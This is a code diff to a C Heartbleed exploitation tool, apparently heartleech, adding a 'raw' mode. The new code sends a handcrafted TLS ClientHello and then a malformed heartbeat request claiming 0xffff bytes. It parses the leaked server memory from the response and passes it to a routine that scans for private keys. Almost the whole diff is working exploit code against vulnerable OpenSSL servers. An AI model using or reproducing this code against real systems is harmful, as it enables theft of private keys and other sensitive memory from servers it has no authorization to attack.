@@ -116,6 +116,7 @@ int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);
 int is_debug = 0;
 int is_scan = 0;
 
+
 /**
  * The "scan-result" verdict, whether the system is vulnerable, safe, or
  * inconclusive
@@ -160,8 +161,8 @@ struct Connection {
     BIGNUM n;
     BIGNUM e;
 
-    size_t buf_count;
-    unsigned char buf[70000];
+    size_t buf2_count;
+    unsigned char buf2[70000];
 
 };
 
@@ -282,6 +283,7 @@ struct DumpArgs {
     unsigned is_auto_pwn;
     unsigned is_rand_size;
     unsigned ip_ver;
+    unsigned is_raw;
     unsigned long long total_bytes;
     struct {
         char *host;
@@ -291,6 +293,17 @@ struct DumpArgs {
     unsigned default_port;
     struct CapturePatterns patterns;
 };
+
+
+static void print_status(const struct DumpArgs *args)
+{
+    static time_t last_status = 0;
+    if (last_status + 1 <= time(0)) {
+        if (!args->is_scan)
+            fprintf(stderr, "%llu bytes downloaded\r", args->total_bytes);
+        last_status = time(0);
+    }
+}
 
 /******************************************************************************
  ******************************************************************************/
@@ -464,6 +477,18 @@ load_pcre(void)
     fprintf(stderr, "PCRE library: %s\n", PCRE.version());
 }
 
+void connection_buf_init(struct Connection *connection)
+{
+    connection->buf2_count = 0;
+}
+
+void connection_buf_append(struct Connection *connection, const void *buf, size_t length)
+{
+    if (length > sizeof(connection->buf2) - connection->buf2_count)
+        length = sizeof(connection->buf2) - connection->buf2_count;
+    memcpy(connection->buf2 + connection->buf2_count, buf, length);
+    connection->buf2_count += length;
+}
 
 
 /******************************************************************************
@@ -546,10 +571,7 @@ receive_heartbeat(int write_p, int version, int content_type,
     /*
      * Copy this to the buffer
      */
-    if (len > sizeof(connection->buf) - connection->buf_count)
-        len = sizeof(connection->buf) - connection->buf_count;
-    memcpy(connection->buf + connection->buf_count, buf, len);
-    connection->buf_count += len;
+    connection_buf_append(connection, buf, len);
 
     /*
      * Display bytes if not dumping to file
@@ -1420,6 +1442,311 @@ starttls_pop3(int fd,
     return 0;
 }
 
+/******************************************************************************
+ ******************************************************************************/
+struct SSL_RECORD {
+    unsigned short remaining;
+    unsigned char state;
+    unsigned char type;
+    struct {
+        unsigned short remaining;
+        unsigned char state;
+        unsigned is_heartbleed_received:1;
+    } heartbleed;
+};
+
+/******************************************************************************
+ ******************************************************************************/
+static int
+raw_parse_heartbeat(struct SSL_RECORD *rec, const unsigned char *buf, size_t buf_size,
+    struct Connection *connection)
+{
+    size_t i;
+    enum {TAG, LEN0, LEN1, CONTENT, END};
+
+    for (i=0; i<buf_size; i++) {
+        switch (rec->heartbleed.state) {
+        case TAG:
+            if (buf[i] != 2) {
+                DEBUG_MSG("[-] unknown heartbleedtype\n");
+                rec->heartbleed.state = END;
+            } else {
+                rec->heartbleed.state++;
+            }
+            break;
+        case LEN0:
+            rec->heartbleed.remaining = buf[i]<<8;
+            rec->heartbleed.state++;
+            break;
+        case LEN1:
+            rec->heartbleed.remaining |= buf[i];
+            rec->heartbleed.state++;
+            break;
+        case CONTENT:
+            //DEBUG_MSG("[*] 0x%0x bytes remaining\n", rec->heartbleed.remaining);
+            {
+                size_t frag_len = buf_size - i;
+                if (frag_len > rec->heartbleed.remaining)
+                    frag_len = rec->heartbleed.remaining;
+
+                connection_buf_append(connection, buf+i, frag_len);
+
+                rec->heartbleed.remaining -= frag_len;
+                i += frag_len - 1;
+
+                //DEBUG_MSG("[+] 0x%0x bytes remaining\n", rec->heartbleed.remaining);
+                if (rec->heartbleed.remaining <= 199)
+                    rec->heartbleed.is_heartbleed_received = 1;
+                if (rec->heartbleed.remaining == 0) {
+                    rec->heartbleed.state = END;
+                }
+            }
+            break;
+        case END:
+            i = buf_size;
+            break;
+        }
+    }
+    return 0;
+}
+
+/******************************************************************************
+ ******************************************************************************/
+static int
+raw_parse_ssl(struct SSL_RECORD *rec, const unsigned char *buf, size_t *offset, size_t buf_size,
+    struct Connection *connection)
+{
+    size_t i;
+    enum {TAG, VER_MAJOR, VER_MINOR, LEN0, LEN1, CONTENT, END};
+
+    for (i=*offset; i<buf_size; i++) {
+        switch (rec->state) {
+        case TAG:
+            if (buf[i] < 20 || 25 < buf[i]) {
+                DEBUG_MSG("[-] unknown SSL record type\n");
+                return -1;
+            }
+            rec->type = buf[i];
+            rec->state++;
+            break;
+        case VER_MAJOR:
+            if (buf[i] != 3) {
+                DEBUG_MSG("[-] unknown SSL version\n");
+                return -1;
+            }
+            rec->state++;
+            break;
+        case VER_MINOR:
+            if (3 < buf[i]) {
+                DEBUG_MSG("[-] unknown SSL minor version\n");
+                return -1;
+            }
+            rec->state++;
+            break;
+        case LEN0:
+            rec->remaining = buf[i]<<8;
+            rec->state++;
+            break;
+        case LEN1:
+            rec->remaining |= buf[i];
+            rec->state++;
+            DEBUG_MSG("[+] type=0x%0x len=0x%0x\n", rec->type, rec->remaining);
+            break;
+        case CONTENT:
+            {
+                size_t frag_len = buf_size - i;
+                if (frag_len > rec->remaining)
+                    frag_len = rec->remaining;
+
+                switch (rec->type) {
+                case 24:
+                    raw_parse_heartbeat(rec, buf+i, frag_len, connection);
+                    break;
+                default:
+                    break;
+                }
+
+                rec->remaining -= frag_len;
+                i += frag_len - 1;
+
+                if (rec->remaining == 0) {
+                    rec->state = 0;
+                    *offset = i + 1;
+                    return 0;
+                }
+            }
+            break;
+        default:
+            i = buf_size;
+            break;
+        }
+    }
+
+    *offset = i;
+    return 0;
+}
+
+
+/******************************************************************************
+ * Do the raw TCP connection, before the handshake has completed
+ ******************************************************************************/
+static int
+ssl_thread_raw(int fd, const struct DumpArgs *args, struct Target *target,
+                struct Connection *connection)
+{
+    static const char client_hello[] = 
+        "\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03\x92\x2b\xa1\xe5\x46"
+        "\x09\x59\x03\xcc\xf2\x6a\xd7\x4c\xc8\xb9\xd3\x72\x35\xcb\xf6\x0b"
+        "\x92\xe3\xcd\x30\x6c\x9a\x67\x84\x49\x00\x82\x00\x00\xa0\xc0\x30"
+        "\xc0\x2c\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\xa3"
+        "\x00\x9f\x00\x6b\x00\x6a\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x32"
+        "\xc0\x2e\xc0\x2a\xc0\x26\xc0\x0f\xc0\x05\x00\x9d\x00\x3d\x00\x35"
+        "\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d"
+        "\xc0\x03\x00\x0a\xc0\x2f\xc0\x2b\xc0\x27\xc0\x23\xc0\x13\xc0\x09"
+        "\xc0\x1f\xc0\x1e\x00\xa2\x00\x9e\x00\x67\x00\x40\x00\x33\x00\x32"
+        "\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x31\xc0\x2d\xc0\x29\xc0\x25"
+        "\xc0\x0e\xc0\x04\x00\x9c\x00\x3c\x00\x2f\x00\x96\x00\x41\x00\x07"
+        "\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12"
+        "\x00\x09\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00"
+        "\x01\x33\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x34\x00\x32"
+        "\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a"
+        "\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04"
+        "\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10"
+        "\x00\x11\x00\x23\x00\x00\x00\x0d\x00\x20\x00\x1e\x06\x01\x06\x02"
+        "\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01"
+        "\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x00\x0f\x00\x01\x01\x00"
+        "\x15\x00\xc2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+        "\x00\x00\x00\x00\x00";
+    int x;
+    time_t start_time;
+    unsigned char buf[16384];
+    size_t buf_size;
+    size_t offset;
+    struct SSL_RECORD rec;
+    unsigned is_fail = 0;
+
+    memset(&rec, 0, sizeof(rec));
+
+    /*
+     * Send the client hello
+     */
+    x = send(fd, client_hello, sizeof(client_hello)-1, MSG_NOSIGNAL);
+    if (x < 3) {
+        ERROR_MSG("[-] raw handshake: %s (%u)\n",
+            error_msg(WSAGetLastError()), WSAGetLastError());
+        return -1;
+    }
+
+    /*
+     * Wait for the server response
+     */
+    for (;;) {
+        start_time = time(0);
+        while (!is_incoming_data(fd)) {
+            if (start_time + args->timeout < time(0)) {
+                ERROR_MSG("[-] raw handshake: timed out\n");
+                return -1;
+            }
+        }
+        buf_size = recv(fd, (char*)buf, sizeof(buf), 0);
+        if (buf_size == 0) {
+            ERROR_MSG("[-] raw handshake: %s (%u)\n",
+                error_msg(WSAGetLastError()), WSAGetLastError());
+            return -1;
+        }
+
+        /*
+         * Parse the response
+         */
+        offset = 0;
+        x = raw_parse_ssl(&rec, buf, &offset, buf_size, connection);
+        if (x == -1) {
+            ERROR_MSG("[-] raw handshake: parse error\n");
+            return -1;
+        }
+        if (rec.state == 0)
+            break;
+    }
+
+
+    /*
+     * Send heartbeat request
+     */
+    rec.heartbleed.state = 0;
+resend:
+    x = send(fd, "\x18\x03\x03\x00\x03"
+                 "\x01\xff\xff", 8, MSG_NOSIGNAL);
+    if (x < 3) {
+        ERROR_MSG("[-] raw handshake: %s (%u)\n",
+            error_msg(WSAGetLastError()), WSAGetLastError());
+        return -1;
+    }
+    rec.heartbleed.is_heartbleed_received = 0;
+
+    print_status(args);
+
+    /*
+     * Parse remaining data
+     */
+    while (!rec.heartbleed.is_heartbleed_received) {
+        if (offset >= buf_size) {
+            start_time = time(0);
+            while (!is_incoming_data(fd)) {
+                if (start_time + args->timeout < time(0)) {
+                    ERROR_MSG("[-] raw handshake: timed out\n");
+                    goto fail;
+                }
+            }
+            buf_size = recv(fd, (char*)buf, sizeof(buf), 0);
+            if (buf_size == 0) {
+                ERROR_MSG("[-] raw handshake: %s (%u)\n",
+                    error_msg(WSAGetLastError()), WSAGetLastError());
+                goto fail;
+            }
+            offset = 0;
+        }
+
+        /*
+         * Parse the response
+         */
+        while (offset < buf_size) {
+            x = raw_parse_ssl(&rec, buf, &offset, buf_size, connection);
+            if (x == -1) {
+                ERROR_MSG("[-] raw handshake: parse error\n");
+                return -1;
+            }
+        }
+    }
+
+    goto end;
+
+fail:
+    is_fail = 1;
+end:
+    if (connection->buf2_count) {
+        DEBUG_MSG("[+] received %u bytes of heartbleed\n", connection->buf2_count);
+        process_bleed(args, connection->buf2, connection->buf2_count,
+                        connection->n, connection->e);
+        connection_buf_init(connection);
+    }
+
+    if (!is_fail)
+        ; //goto resend;
+
+    return 0;
+}
+
 
 
 /******************************************************************************
@@ -1442,7 +1769,6 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
     size_t total_bytes = 0;
     char port[6];
     time_t started;
-    time_t last_status = 0;
     struct Connection connection[1];
     const char *hostname;
 
@@ -1583,6 +1909,13 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
         goto end;
     }
 
+    /*
+     * If doing mid-handshake heartbeats, then switch to that
+     */
+    if (args->is_raw) {
+        ssl_thread_raw(fd, args, target, connection);
+        goto end;
+    }
 
     /*
      * Initialize SSL structures. Specifically, we initialize them with
@@ -1721,20 +2054,16 @@ again:
      * Print how many bytes we've downloaded on command-line every
      * second (to <stderr>)
      */
-    if (last_status + 1 <= time(0)) {
-        if (!args->is_scan)
-            fprintf(stderr, "%llu bytes downloaded\r", args->total_bytes);
-        last_status = time(0);
-    }
+    print_status(args);
 
     /*
      * If we have a buffer, flush it to the file. This may also scan the buffer
      * for private keys and other useful information
      */
-    if (connection->buf_count) {
-        process_bleed(args, connection->buf, connection->buf_count,
+    if (connection->buf2_count) {
+        process_bleed(args, connection->buf2, connection->buf2_count,
                       connection->n, connection->e);
-        connection->buf_count = 0;
+        connection_buf_init(connection);
     }
 
     /*
@@ -1749,7 +2078,7 @@ again:
         ssl3_write_bytes(ssl,
                          SSL3_RT_APPLICATION_DATA,
                          target->http_request,
-                         (int)strlen(target->http_request));
+                         (int)strlen(target->http_request)-10);
         break;
     case APP_SMTP:
         ssl3_write_bytes(ssl,
@@ -1878,6 +2207,8 @@ again:
             } else {
                 unsigned err = WSAGetLastError();
                 DEBUG_MSG("[-] receive error: %s (%u)\n", error_msg(err), err);
+                if (connection->heartbleeds.succeeded == 0 && target->loop.done <= 2)
+                    target->application = 0;
                 goto end;
             }
         }
@@ -1922,8 +2253,9 @@ again:
      */
     DEBUG_MSG("[+] connection terminated\n");
 end:
-    process_bleed(args, connection->buf, connection->buf_count,
+    process_bleed(args, connection->buf2, connection->buf2_count,
                   connection->n, connection->e);
+    connection_buf_init(connection);
     SSL_free(ssl);
     SSL_CTX_free(ctx);
     closesocket(fd);
@@ -2251,6 +2583,9 @@ heartleech_set_parameter(struct DumpArgs *args,
         return 1;
     } else if (EQUALS("rand", name)) {
         args->is_rand_size = 1;
+        return 0; /* no 'value' argument */
+    } else if (EQUALS("raw", name)) {
+        args->is_raw = 1;
         return 0; /* no 'value' argument */
     } else if (EQUALS("read", name)) {
         if (args->offline_filename) {
